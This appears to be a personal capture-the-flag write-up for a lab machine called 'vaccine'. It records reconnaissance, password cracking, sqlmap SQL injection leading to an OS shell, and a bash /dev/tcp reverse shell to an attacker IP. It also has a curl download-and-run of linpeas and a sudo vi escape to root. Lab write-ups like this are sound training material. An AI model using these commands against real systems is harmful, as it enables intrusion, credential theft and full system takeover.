
# Nmap

Lets start with a basic scan and see what we can find:
`sudo nmap -sV -sC 10.129.95.174 -oN nmap.basic`


![[Pasted image 20250523221800.png]]

`sudo nmap -p- -sV -sC --script=default,vuln,exploit -T4 -oN nmap.full 10.129.95.174`

This returned an interesting point. CSRF?
![[Pasted image 20250523223419.png]]


==Thoughts==: 
1. I see anonymous ftp is allowed and we have `backup.zip`
2. http server running php


## Let's look into anonymous ftp and backup.zip
-> We can get the backup.zip file with ftp, but we need a password from index.php, let's look into the webserver and see what we can find.

![[Pasted image 20250523222359.png]]
We have a login screen. Ideas 

- [x] fuff for directory discovery
- [ ] XSS?
- [x] SQLi -> sqlmap <- ==Seems like not==
- [ ] Command injection
- [ ] Are there any vulnerabilities is vsftp 3.0.3 ?
- [ ] CSRF? <- Possibly? Session fixation?

### ffuf:
`ffuf -w /opt/redteam/Assetnote/automated/httparchive_directories_1m_2024_05_28.txt -u http://10.129.95.174/FUZZ`

I found this page at this URL from ffuf:
`http://10.129.95.174/index.php/index/$$$call$$$/page/page`
![[Pasted image 20250523222916.png]]


==Thoughts==
1. We have a PHPSESSID, is there anyway we can abuse that?
2. What is this `$$$call$$$` thing?

# sqlmap

Save this file to ==req.txt==
![[Pasted image 20250523224516.png]]

Then run this ==sqlmap command==
`sqlmap -r req.txt --level=5 --risk=3 --batch --threads=4`

How to test a parameter directly:
==sqlmap -u "http://10.129.95.174/index.php/UV/$$$call$$$/submission/cover" --data="username=admin&password=test" -p username --batch==

## Try to crack zip with john

1. `zip2john protected.zip > zip.hash`
2. `john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt`
	1. The password is `741852963`

## What is in backup.zip?
1. Index.php!
![[Pasted image 20250523225733.png]]

==md5 hash above, let's try to crack it with hashcat==

![[Pasted image 20250523230118.png]]
What hash type should we try?

`hashcat hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

The password is ==qwerty789==

^^ These creds do not work for either ftp or ssh
## Let's login to the web page

![[Pasted image 20250523230619.png]]

- [ ] Can we abuse the search bar? Yes!

![[Pasted image 20250523230846.png]]

^^ what happens when a single quote is put into the search bar.

Let's feed that web request to sqlmap and see what it finds

`sqlmap -r req.txt --level=5 --risk=3 --batch --threads=4`

![[Pasted image 20250523231126.png]]


## Got an OS shell with sqlmap, let's see what we can do with that.
1. Start a Netcat listener: `nc -lvnp 4444`
2. With the sqlmap os-shell send a shell back to the listener: 
		`bash -c 'bash -i >& /dev/tcp/10.10.16.85/4444 0>&1'`
3. ==Send a reverse shell automatically with sqlmap:== [[Reverse Shell Upgrades]]
	 - `sqlmap -r req.txt --level=5 --risk=3 --batch --threads=4 --os-cmd="bash -c 'bash -i >& /dev/tcp/10.10.16.85/4444 0>&1'"`

## Uname -a:
'Linux vaccine 5.3.0-64-generic #58-Ubuntu SMP Fri Jul 10 19:33:51 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux'

## Look for 'user.txt':
`find / -name user.txt 2>/dev/null`

## Try to upload and run linpeas.sh: [[Linux Privilege Escalation]]
`curl http://10.10.16.85/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh`

2. RUN linpeas and save to a file: 
	`./linpeas.sh | tee /tmp/linpeas-output.txt``

## Linpeas output:
![[Pasted image 20250526152212.png]]

^^ What is this vulnerability? 
https://ubuntu.com/security/CVE-2021-3560

^^ I tried it. It didn't work.

# How to get an interactive shell when a reverse shell is present: [[Reverse Shell Upgrades]]
1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. Ctrl-Z
3. stty raw -echo
4. fg
OR 
-> script /dev/null -c bash


## Search for postgres password:

==in /var/www/html/dashboard.php==
![[Pasted image 20250526154841.png]]Password: P@s5w0rd!

![[Pasted image 20250526155108.png]]

==We can execute vi with privs==

Once you execute: `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
You can execute `!bash` in vi and get a root shell.

![[Pasted image 20250526160158.png]]

